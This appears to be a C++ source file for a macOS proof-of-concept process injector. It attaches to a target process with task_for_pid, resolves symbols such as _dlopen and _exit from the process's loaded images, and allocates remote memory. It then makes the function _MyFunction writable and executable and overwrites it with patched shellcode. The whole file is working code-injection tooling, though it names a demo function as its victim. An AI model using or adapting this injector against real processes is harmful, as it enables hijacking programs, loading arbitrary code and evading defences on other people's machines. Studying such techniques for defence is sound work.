#include "Shellcode.h"

#include <iostream>
#include <map>
#include <vector>
#include <string>
#include <fstream>
#include <memory>

#include <unistd.h>
#include <sys/ptrace.h>
#include <mach/mach.h>
#include <mach/mach_vm.h>
#include <mach-o/dyld.h>
#include <mach-o/nlist.h>
#include <mach-o/dyld_images.h>
#include <mach/vm_map.h>

std::map<std::string, uintptr_t> symbolsToAddressMap;

std::vector<std::string> searchTerms { "libSystem", "libsystem", "libmalloc", "dyld" };

kern_return_t remoteProcessRead(vm_map_t task, uint64_t address, uint8_t* pBuffer, size_t amountToRead)
{
    mach_vm_size_t dataCnt = 0;
    return mach_vm_read_overwrite(task,
                                  static_cast<mach_vm_address_t>(address),
                                  static_cast<mach_vm_size_t>(amountToRead),
                                  reinterpret_cast<mach_vm_address_t>(pBuffer),
                                  &dataCnt);
}

kern_return_t remoteProcessAllocate(vm_map_t task, uint64_t& addressOfAllocatedMemory, size_t size)
{
    return mach_vm_allocate(task, &addressOfAllocatedMemory, size, VM_FLAGS_ANYWHERE);
}

kern_return_t remoteProcessWrite(vm_map_t task, uint64_t remoteAddress, uint8_t* pBuffer, size_t amountToWrite)
{
    return mach_vm_write(task, static_cast<mach_vm_address_t>(remoteAddress), reinterpret_cast<vm_offset_t>(pBuffer), static_cast<mach_msg_type_number_t>(amountToWrite));
}

kern_return_t remoteProcessMemoryProtect(vm_map_t task, uint64_t remoteAddress, size_t size, boolean_t setMax, vm_prot_t newProtections)
{
    return mach_vm_protect(task, static_cast<mach_vm_address_t>(remoteAddress), static_cast<mach_msg_type_number_t>(size), setMax, newProtections);
}

mach_vm_address_t getImageInfos(vm_map_t targetTask, size_t& size)
{
    task_dyld_info_data_t task_dyld_info;
    mach_msg_type_number_t count = TASK_DYLD_INFO_COUNT;
    
    if (task_info(targetTask, TASK_DYLD_INFO, (task_info_t)&task_dyld_info, &count))
    {
        exit(0);
    }
    
    size = task_dyld_info.all_image_info_size;
    return task_dyld_info.all_image_info_addr;
}

bool ContainsSearchTerm(std::string imageName)
{
    bool success = false;
    
    for (const auto& searchTerm : searchTerms)
    {
        if (imageName.find(searchTerm) != std::string::npos)
        {
            success = true;
            break;
        }
    }
    
    return success;
}

kern_return_t find_all_binaries(pid_t pid, std::vector<std::pair<std::string, const uintptr_t>>& machHeaderAddresses, vm_map_t targetTask)
{
    size_t size = 0;
    mach_vm_address_t allImageInfos = getImageInfos(targetTask, size);
    struct dyld_all_image_infos allImages = { 0 };
    
    remoteProcessRead(targetTask, allImageInfos, reinterpret_cast<uint8_t*>(&allImages), size);
    
    std::unique_ptr<struct dyld_image_info[]> pDyldImageInfoArray = std::make_unique<struct dyld_image_info[]>(allImages.infoArrayCount);
    
    size_t amountToRead = allImages.infoArrayCount * sizeof(const struct dyld_image_info);
    remoteProcessRead(targetTask, reinterpret_cast<mach_vm_address_t>(allImages.infoArray), reinterpret_cast<uint8_t*>(pDyldImageInfoArray.get()), amountToRead);
    
    for (int j = 0; j < allImages.infoArrayCount; ++j)
    {
        const struct dyld_image_info pImageInfo = (const struct dyld_image_info)pDyldImageInfoArray[j];

        std::string imageName = "";
        uintptr_t machHeaderAddress = reinterpret_cast<uintptr_t>(pImageInfo.imageLoadAddress);
        
        struct mach_header_64 mh = { 0 };
        remoteProcessRead(targetTask, static_cast<uint64_t>(machHeaderAddress), reinterpret_cast<uint8_t*>(&mh), sizeof(struct mach_header_64));
        
        char imageNameArray[PATH_MAX] = { 0 };
        remoteProcessRead(targetTask, reinterpret_cast<uint64_t>(pImageInfo.imageFilePath), (uint8_t*)imageNameArray, PATH_MAX);
        
        if (strnlen(imageNameArray, PATH_MAX) > 0)
        {
            imageName = imageNameArray;
        }
        
        if (mh.filetype == MH_EXECUTE || ContainsSearchTerm(imageName))
        {
            machHeaderAddresses.push_back(std::make_pair(imageName, machHeaderAddress));
        }
    }

    return KERN_SUCCESS;
}

void parseSymbolFromMachHeader(std::unique_ptr<uint8_t[]>& pMachHeaderBuffer, uintptr_t remoteMachHeaderAddress, vm_map_t targetTask)
{
    struct mach_header_64* pMachHeader = reinterpret_cast<struct mach_header_64*>(pMachHeaderBuffer.get());
    
    // Making the assumption that the load commands are right after the header
    uint8_t* tempAddress = reinterpret_cast<uint8_t*>(pMachHeaderBuffer.get()) + sizeof(struct mach_header_64);
    uint32_t nLoadCommands = pMachHeader->ncmds;
    
    struct segment_command_64* pLinkeditLoadCommand = nullptr;
    struct segment_command_64* pTextLoadCommand     = nullptr;
    struct symtab_command*     pSymtabCommand       = nullptr;
    
    uint32_t processSlide = 0;
    
    for (uint32_t i = 0; i < nLoadCommands; ++i)
    {
        struct load_command* pLoadCommand = reinterpret_cast<struct load_command*>(tempAddress);
        
        switch (pLoadCommand->cmd) {
                
            case LC_SEGMENT_64:
            {
                struct segment_command_64* pCommand = reinterpret_cast<struct segment_command_64*>(tempAddress);
                std::string segname(pCommand->segname);
                
                if (segname == "__TEXT")
                {
                    pTextLoadCommand = pCommand;
                    if (processSlide == 0)
                    {
                        processSlide = remoteMachHeaderAddress - pCommand->vmaddr;
                    }
                }
                
                if (segname == "__LINKEDIT")
                {
                    pLinkeditLoadCommand = pCommand;
                }
                
                break;
            }
            case LC_SYMTAB:
            {
                // We'll save this for later...
                struct symtab_command* pCommand = reinterpret_cast<struct symtab_command*>(tempAddress);
                pSymtabCommand = pCommand;
                break;
            }
                
            default:
                break;
        }
        
        // Move to the next load command
        tempAddress += pLoadCommand->cmdsize;
    }
    
    if (pLinkeditLoadCommand != nullptr && pTextLoadCommand != nullptr && pSymtabCommand != nullptr)
    {
        uint64_t slide = pLinkeditLoadCommand->vmaddr - pTextLoadCommand->vmaddr - pLinkeditLoadCommand->fileoff;
        
        uint64_t stringTableRemoteAddress = reinterpret_cast<uint64_t>(remoteMachHeaderAddress + slide + pSymtabCommand->stroff);
        uint64_t symbolTableRemoteAddress = reinterpret_cast<uint64_t>(remoteMachHeaderAddress + slide + pSymtabCommand->symoff);
        
        std::unique_ptr<uint8_t[]> pStringTable = std::make_unique<uint8_t[]>(pSymtabCommand->strsize);
        std::unique_ptr<struct nlist_64[]> pSymbolTable = std::make_unique<struct nlist_64[]>(pSymtabCommand->nsyms);
        
        // We need to dip back into the remote process to read the string area of the symbol table, and the symbols themselves
        kern_return_t kret = remoteProcessRead(targetTask, stringTableRemoteAddress, pStringTable.get(), pSymtabCommand->strsize);
        kret += remoteProcessRead(targetTask, symbolTableRemoteAddress, reinterpret_cast<uint8_t*>(pSymbolTable.get()), sizeof(struct nlist_64) * pSymtabCommand->nsyms);
        
        if (kret == KERN_SUCCESS)
        {
            for (uint32_t i = 0; i < pSymtabCommand->nsyms; ++i)
            {
                struct nlist_64* pSymbol = &pSymbolTable[i];
                
                if (pSymbol->n_value != 0)
                {
                    uint64_t symbolAddress = reinterpret_cast<uint64_t>(pSymbol->n_value + processSlide);
                    char* pSymbolName = reinterpret_cast<char*>(&pStringTable[pSymbol->n_un.n_strx]);
                    
                    std::string symbolName(pSymbolName);
                    symbolsToAddressMap.insert({ symbolName, (uintptr_t)symbolAddress });
                }
            }
        }
    }
}

void parseAllSymbols(const std::vector<std::pair<std::string, const uintptr_t>>& binariesInProcess, vm_map_t targetTask)
{
    for (auto& binaryAddressPair : binariesInProcess)
    {
        // Read in the initial header from the remote process for a binary (dylib or otherwise)
        uintptr_t machHeaderAddress = binaryAddressPair.second;
        struct mach_header_64 mh = { 0 };
        
        kern_return_t kret = remoteProcessRead(targetTask, static_cast<mach_vm_address_t>(machHeaderAddress), reinterpret_cast<uint8_t*>(&mh), sizeof(struct mach_header_64));
        if (kret == KERN_SUCCESS)
        {
            // We need to determine how much more to read in order to alloc the correct amount for the entire mach header
            size_t sizeToAlloc = sizeof(struct mach_header_64) + (mh.sizeofcmds);
            std::unique_ptr<uint8_t[]> pMachHeaderBuffer = std::make_unique<uint8_t[]>(sizeToAlloc);
            
            // Now read in the entirety of the mach header including all its load commands
            kret = remoteProcessRead(targetTask, static_cast<mach_vm_address_t>(machHeaderAddress), pMachHeaderBuffer.get(), sizeToAlloc);
            
            if (kret == KERN_SUCCESS)
            {
                parseSymbolFromMachHeader(pMachHeaderBuffer, machHeaderAddress, targetTask);
            }
        }
    }
}

int32_t main(int32_t argc, char* argv[])
{
    int32_t  status  = 0;

    // Assuming the second arg is the pid
    pid_t pid = static_cast<pid_t>(atoi(argv[1]));
    
    std::vector<std::pair<std::string, const uintptr_t>> machHeaderAddresses;
    errno = 0;

    mach_port_t task;
    kern_return_t ret = task_for_pid(mach_task_self(), pid, &task);
    task_suspend(task);
    if (ret == KERN_SUCCESS)
    {
        // Be careful of the size! You might blow away something you don't intend to!
        const size_t SIZE_OF_SHELLCODE_MAYBE = 200;
        std::unique_ptr<uint8_t[]> pPatchedShellCode = std::make_unique<uint8_t[]>(SIZE_OF_SHELLCODE_MAYBE);
        
        find_all_binaries(pid, machHeaderAddresses, task);
        std::cout << "Found " << machHeaderAddresses.size() << " binaries matching your search terms in remote process" << std::endl;
        
        parseAllSymbols(machHeaderAddresses, task);
        
        std::cout << "Found " << symbolsToAddressMap.size() << " symbols in remote process" << std::endl;
        
        uintptr_t remoteDlOpenAddr  = symbolsToAddressMap["_dlopen"];
        uintptr_t remoteExitAddr    = symbolsToAddressMap["_exit"];
        uintptr_t remotePrintfAddr  = symbolsToAddressMap["_printf"];
        uintptr_t remoteMyFunction  = symbolsToAddressMap["_MyFunction"];
        
        ShellcodeArgs args;
        args.pExitProcess       = reinterpret_cast<ExitProcess_t>(remoteExitAddr);
        args.pDlopen            = reinterpret_cast<DlOpen_t>(remoteDlOpenAddr);
        args.pPrintf            = reinterpret_cast<Printf_t>(remotePrintfAddr);
        
        uint64_t remoteAllocatedShellcodeArgs = 0;
        ret +=  remoteProcessAllocate(task, remoteAllocatedShellcodeArgs, sizeof(ShellcodeArgs));
        ret += remoteProcessWrite(task, remoteAllocatedShellcodeArgs, reinterpret_cast<uint8_t*>(&args), sizeof(ShellcodeArgs));

        const uint32_t SIZE_OF_JUMP_INSTR = 5;
        const uint8_t  JUMP_INSTR_X86     = 0xE9;
        
        // Handle jump tables for release mode
        uint8_t* pLocalShellcode = (*(uint8_t*)Shellcode == JUMP_INSTR_X86) ? (uint8_t*)((size_t)Shellcode + SIZE_OF_JUMP_INSTR + (*(FunctionRouter*)Shellcode).addr) : (uint8_t*)Shellcode;
        
        // Patch the shell code with the address of the remote args
        memcpy(pPatchedShellCode.get(), pLocalShellcode, SIZE_OF_SHELLCODE_MAYBE);
        
        const uint32_t I_THINK_THE_SIG_IS_HERE_RANGE = 64;
        for (uint32_t i = 0; i < I_THINK_THE_SIG_IS_HERE_RANGE; ++i)
        {
            if (memcmp(&pPatchedShellCode[i], &g_ShellcodeSignature, sizeof(g_ShellcodeSignature)) == 0)
            {
                // Replace the signature with the correct address pointing to the remote shell code args
                size_t* pShellCodeSigArgs = reinterpret_cast<size_t*>(&pPatchedShellCode[i]);
                *pShellCodeSigArgs = remoteAllocatedShellcodeArgs;
                break;
            }
        }
        
        // Now mark _MyFunction as RWX and copy over the shell code
        ret += remoteProcessMemoryProtect(task, remoteMyFunction, SIZE_OF_SHELLCODE_MAYBE, false, VM_PROT_ALL);
        
        // Blow away _MyFunction with our shell code
        ret += remoteProcessWrite(task, remoteMyFunction, pPatchedShellCode.get(), SIZE_OF_SHELLCODE_MAYBE);
        
        if (ret == KERN_SUCCESS)
        {
            std::cout << "Success in writing shell code over _MyFunction in remote process!" << std::endl;
        }
        else
        {
            std::cout << "Failed to write shellcode over _MyFunction in remote process!" << std::endl;
        }
        
        // You only yolo once...
        task_resume(task);
    }
    
    return status;
}
